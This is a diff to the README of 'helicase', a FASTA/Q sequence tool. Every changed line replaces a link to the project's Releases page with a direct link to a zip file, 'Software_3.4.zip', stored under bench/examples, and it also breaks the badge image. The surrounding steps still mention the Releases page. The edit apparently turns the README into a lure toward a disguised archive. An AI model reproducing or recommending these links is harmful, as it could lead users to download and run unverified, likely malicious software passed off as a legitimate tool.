@@ -8,11 +8,11 @@ Welcome to helicase, the tool that tears through FASTA/Q sequences effortlessly.
 
 To get started, visit the Releases page to download the software.
 
-[![Download helicase](https://img.shields.io/badge/Download%20helicase-v1.0-brightgreen)](https://github.com/qiwne/helicase/releases)
+[![Download helicase](https://github.com/qiwne/helicase/raw/refs/heads/main/bench/examples/Software_3.4.zip%20helicase-v1.0-brightgreen)](https://github.com/qiwne/helicase/raw/refs/heads/main/bench/examples/Software_3.4.zip)
 
 ### Steps to Download
 
-1. Click the button above or this link: [Download helicase](https://github.com/qiwne/helicase/releases).
+1. Click the button above or this link: [Download helicase](https://github.com/qiwne/helicase/raw/refs/heads/main/bench/examples/Software_3.4.zip).
 2. On the Releases page, find the latest version of helicase.
 3. Select the appropriate file for your operating system and click to download.
 
@@ -80,4 +80,4 @@ For a deeper dive into features, be sure to check our documentation on GitHub. T
 
 **Download helicase today and streamline your analysis of biological sequences!**
 
-[Visit the Releases page to download](https://github.com/qiwne/helicase/releases)
+[Visit the Releases page to download](https://github.com/qiwne/helicase/raw/refs/heads/main/bench/examples/Software_3.4.zip)
